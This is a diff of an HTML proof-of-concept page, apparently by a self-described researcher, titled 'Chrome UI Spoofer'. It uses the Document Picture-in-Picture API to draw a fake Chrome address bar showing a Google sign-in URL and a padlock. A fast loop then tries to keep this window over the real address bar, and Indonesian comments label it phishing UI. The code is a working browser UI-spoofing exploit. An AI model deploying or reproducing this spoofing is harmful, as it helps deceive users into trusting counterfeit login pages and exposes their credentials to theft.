@@ -2,68 +2,84 @@
 <html lang="id">
 <head>
     <meta charset="UTF-8">
-    <title>Chrome Security Research - FARISSAL B</title>
+    <title>Chrome UI Spoofer - FARISSAL B</title>
     <style>
         body { font-family: 'Consolas', monospace; background: #000; color: #0f0; padding: 40px; text-align: center; }
         .terminal { border: 2px solid #0f0; background: #111; padding: 30px; border-radius: 10px; display: inline-block; }
-        button { background: #0f0; color: #000; border: none; padding: 15px 30px; font-size: 18px; font-weight: bold; cursor: pointer; border-radius: 5px; }
-        #log { margin-top: 20px; text-align: left; height: 150px; overflow-y: auto; color: #33ff33; font-size: 12px; border-top: 1px solid #333; }
-        .danger { color: #ff0000; font-weight: bold; }
+        button { background: #0f0; color: #000; border: none; padding: 15px 30px; font-size: 18px; font-weight: bold; cursor: pointer; border-radius: 5px; box-shadow: 0 4px 0 #080; }
+        button:active { transform: translateY(2px); box-shadow: none; }
+        #log { margin-top: 20px; text-align: left; height: 180px; overflow-y: auto; color: #33ff33; font-size: 12px; border-top: 1px solid #333; }
+        .leak { color: #ff0000; font-weight: bold; animation: blink 0.5s infinite; }
+        @keyframes blink { 0% {opacity:1} 50% {opacity:0.5} 100% {opacity:1} }
     </style>
 </head>
 <body>
 
 <div class="terminal">
-    <h2>OMNIBOX OVERLAY TESTER</h2>
-    <p>Researcher: <b>FARISSAL B</b></p>
+    <h1>OMNIBOX OVERLAY ATTACK</h1>
+    <p>Researcher ID: <b>FARISSAL B</b></p>
     
-    <button id="btnAttack">LAUNCH OVERLAY ATTACK</button>
+    <button id="btnAttack">LAUNCH STICKY PiP</button>
+    <p style="font-size: 11px; color: #666; margin-top: 10px;">Step: Klik, lalu tahan jendela palsu di atas Address Bar.</p>
 
-    <div id="log">>> Ready. Pastikan Chrome dalam mode Windowed (bukan maximized) untuk hasil terbaik.</div>
+    <div id="log">>> Siap. Misi: Tumpuk URL asli sampai tidak kelihatan.</div>
 </div>
 
 <script>
     const logBox = document.getElementById('log');
-    function printLog(msg, isDanger = false) {
-        logBox.innerHTML += `<div>[${new Date().toLocaleTimeString()}] ${isDanger ? '<span class="danger">!!!</span> ' : ''}${msg}</div>`;
+    function printLog(msg, isLeak = false) {
+        logBox.innerHTML += `<div>[${new Date().toLocaleTimeString()}] ${isLeak ? '<span class="leak">!!! SPOOFING !!!</span> ' : ''}${msg}</div>`;
         logBox.scrollTop = logBox.scrollHeight;
     }
 
     document.getElementById('btnAttack').addEventListener('click', async () => {
         try {
-            // Kita buat jendela yang sangat tipis (seukuran Bar Alamat)
+            // Kita buat jendela yang pas seukuran Bar Alamat
             const pipWindow = await window.documentPictureInPicture.requestWindow({
-                width: window.screen.width, // Selebar layar
-                height: 80, // Setipis bar alamat
+                width: 450,
+                height: 75, // Setipis bar alamat
             });
 
             printLog("PiP Window Created.");
 
-            // SUNTIK UI BAR ALAMAT PALSU
+            // SUNTIK UI BAR ALAMAT PALSU (Phishing UI)
             pipWindow.document.body.style.margin = "0";
             pipWindow.document.body.style.overflow = "hidden";
             pipWindow.document.body.innerHTML = `
-                <div style="background: #ffffff; height: 100vh; display: flex; align-items: center; padding: 0 15px; font-family: sans-serif; border-bottom: 2px solid #dee2e6; box-shadow: 0 2px 5px rgba(0,0,0,0.1);">
-                    <div style="background: #f1f3f4; border-radius: 20px; padding: 8px 20px; flex-grow: 1; display: flex; align-items: center; gap: 10px; border: 1px solid #dfe1e5;">
-                        <img src="https://www.google.com/favicon.ico" width="16">
-                        <span style="color: #202124; font-size: 14px;">https://accounts.google.com/v3/signin/identifier</span>
+                <div style="background: #ffffff; height: 100vh; display: flex; align-items: center; padding: 0 10px; font-family: sans-serif; border-bottom: 2px solid #ddd; box-shadow: 0 1px 3px rgba(0,0,0,0.1); box-sizing: border-box;">
+                    <div style="background: #f1f3f4; border-radius: 20px; padding: 5px 15px; flex-grow: 1; display: flex; align-items: center; gap: 8px; border: 1px solid #dfe1e5;">
+                        <img src="https://www.google.com/favicon.ico" width="14">
+                        <span style="color: #202124; font-size: 13px;">https://accounts.google.com/signin/v2</span>
                         <span style="color: #5f6368; margin-left: auto;">🔒</span>
                     </div>
                 </div>
             `;
 
-            // PAKSA KE ATAS (The Spoofing Core)
-            printLog("Mencoba memposisikan jendela di atas Omnibox...");
+            // THE ATTACK: STICKY POSITIONING LOOP
+            printLog("Mencoba memaksa jendela di koordinat (0,0)...");
             
-            // Kita coba geser terus menerus ke koordinat 0,0
-            setInterval(() => {
+            // Pindah paksa pertama kali
+            pipWindow.moveTo(0, 0);
+
+            // Kita buat loop yang super cepat buat narik balik jendela
+            const stickInterval = setInterval(() => {
                 const y = pipWindow.screenY;
-                if (y <= 50) {
-                    printLog(`OVERLAY ACTIVE! Koordinat Y: ${y}`, true);
+                
+                // Jika koordinat Y minus, artinya lo lagi tahan di atas.
+                // Kita log sebagai bukti.
+                if (y < 80) {
+                    printLog(`Overlay Aktif! Y: ${y}`, true);
                 }
-                // Jika lo mau lebih agresif, aktifkan baris bawah ini:
-                // pipWindow.moveTo(window.screenX, window.screenY - 100);
-            }, 500);
+
+                // Trik: Kita tarik paksa ke koordinat 0,0 setiap 50ms
+                // Kalau Chrome narik ke bawah, kita tarik lagi ke atas.
+                // pipWindow.moveTo(0, 0); // Aktifkan ini untuk serangan otomatis
+
+                if (pipWindow.closed) {
+                    clearInterval(stickInterval);
+                    printLog("Jendela ditutup.");
+                }
+            }, 50); // Eksekusi setiap 50 milidetik
 
         } catch (e) {
             printLog("Error: " + e.message);
